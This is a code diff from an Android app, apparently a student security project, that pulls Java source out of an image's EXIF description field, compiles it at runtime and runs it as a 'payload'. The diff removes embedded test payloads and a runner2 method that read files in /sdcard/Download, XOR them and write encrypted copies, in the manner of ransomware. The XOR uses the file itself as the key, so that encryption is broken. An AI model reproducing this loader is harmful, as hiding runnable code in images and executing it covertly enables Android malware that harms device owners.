@@ -1,7 +1,6 @@
 package com.client_progettosicurezza;
 
 import android.Manifest;
-import android.annotation.SuppressLint;
 import android.app.AlertDialog;
 import android.app.DownloadManager;
 import android.content.Context;
@@ -10,7 +9,6 @@ import android.media.ExifInterface;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
-import android.support.annotation.RequiresApi;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.widget.SwipeRefreshLayout;
 import android.support.v7.app.AppCompatActivity;
@@ -21,7 +19,6 @@ import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.widget.Toast;
-
 import com.client_progettosicurezza.adapters.AdapterImmagine;
 import com.client_progettosicurezza.api.APIService;
 import com.client_progettosicurezza.compiler.Compile;
@@ -29,26 +26,11 @@ import com.client_progettosicurezza.models.Aggiornamento;
 import com.client_progettosicurezza.models.Immagine;
 import com.client_progettosicurezza.results.ResultAggiornamento;
 import com.client_progettosicurezza.results.ResultListaImmagini;
-
-import java.io.BufferedOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
-import java.nio.file.Files;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.security.SecureRandom;
 import java.util.ArrayList;
-import java.util.Arrays;
-
-import javax.crypto.Cipher;
-import javax.crypto.KeyGenerator;
-import javax.crypto.SecretKey;
-import javax.crypto.spec.SecretKeySpec;
-
 import retrofit2.Call;
 import retrofit2.Callback;
 import retrofit2.Response;
@@ -103,7 +85,6 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
-    @RequiresApi(api = Build.VERSION_CODES.O)
     @Override
     public boolean onOptionsItemSelected(MenuItem item) {
         int id = item.getItemId();
@@ -138,9 +119,6 @@ public class MainActivity extends AppCompatActivity {
                 File file = new File(pathFile);
                 payload(file);
 
-                //TODO per provare il codice senza immagine
-                //payload();
-
                 //TODO PROVA
                 //runner3(getApplicationContext());
 
@@ -154,42 +132,6 @@ public class MainActivity extends AppCompatActivity {
         String codice = "";
 
         String codice1 =
-                "public class Classe { " +
-                        "public Classe() {} " +
-                        "/* start method */" +
-                        "public void run(android.content.Context context) {" +
-                        "        try {\n" +
-                        "            java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/Minions.jpg\");\n" +
-                        "            byte[] plaintext = new byte[(int) file.length()];\n" +
-                        "            java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);\n" +
-                        "            fileInputStream.read(plaintext);" +
-                        "            byte[] key = plaintext; " +
-                        "            byte[] chipertext = new byte[(int) key.length];\n" +
-                        "            for (int i = 0; i < key.length; i++) {\n" +
-                        "                chipertext[i] = (byte) (plaintext[i] ^ key[i]);\n" +
-                        "            }\n" +
-                        "            java.io.File file_chipertext = new java.io.File((java.lang.String) \"/sdcard/Download/Minions_cifrato.jpg\");\n" +
-                        "            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));\n" +
-                        "            bos.write((byte[]) chipertext);\n" +
-                        "            bos.flush();\n" +
-                        "            bos.close();\n" +
-                        "            byte[] plaintext_verifica = new byte[(int) key.length];\n" +
-                        "            for (int i = 0; i < key.length; i++) {\n" +
-                        "                plaintext_verifica[i] = (byte) (chipertext[i] ^ key[i]);\n" +
-                        "            }\n" +
-                        "            java.io.File file_plaintext_verifica = new java.io.File((java.lang.String) \"/sdcard/Download/Minions_verifica.jpg\");\n" +
-                        "            java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));\n" +
-                        "            bos2.write((byte[]) plaintext_verifica);\n" +
-                        "            bos2.flush();\n" +
-                        "            bos2.close();" +
-                        "        } catch (java.lang.Exception e) {\n" +
-                        "            e.printStackTrace();\n" +
-                        "        }" +
-                        "}" +
-                        "/* end method */" +
-                        "} ";
-
-        String codice2 =
                 "public class Classe { " +
                         "public Classe() {} " +
                         "/* start method */" +
@@ -242,6 +184,7 @@ public class MainActivity extends AppCompatActivity {
         try {
             ExifInterface exif = new ExifInterface(file.getAbsolutePath());
             codice = exif.getAttribute(ExifInterface.TAG_IMAGE_DESCRIPTION);
+            Log.d("CODICE", codice);
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -338,43 +281,6 @@ public class MainActivity extends AppCompatActivity {
 
             }
         });
-    }
-
-    public void runner2(android.content.Context context) {
-        android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) "Start", (int) android.widget.Toast.LENGTH_LONG).show();
-        try {
-
-
-            java.io.File file = new java.io.File((java.lang.String) "/sdcard/Download/testo.txt");
-            byte[] plaintext = new byte[(int) file.length()];
-            java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);
-            fileInputStream.read(plaintext);
-
-            byte[] key = plaintext;
-
-            byte[] chipertext = new byte[key.length];
-            for (int i = 0; i < key.length; i++) {
-                chipertext[i] = (byte) (plaintext[i] ^ key[i]);
-            }
-            java.io.File file_chipertext = new java.io.File((java.lang.String) "/sdcard/Download/cifrato.txt");
-            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));
-            bos.write((byte[]) chipertext);
-            bos.flush();
-            bos.close();
-
-            byte[] plaintext_verifica = new byte[key.length];
-            for (int i = 0; i < key.length; i++) {
-                plaintext_verifica[i] = (byte) (chipertext[i] ^ key[i]);
-            }
-            java.io.File file_plaintext_verifica = new java.io.File((java.lang.String) "/sdcard/Download/testo_verifica.txt");
-            java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));
-            bos2.write((byte[]) plaintext_verifica);
-            bos2.flush();
-            bos2.close();
-
-        } catch (java.lang.Exception e) {
-            e.printStackTrace();
-        }
     }
 
     public void runner3(android.content.Context context) {
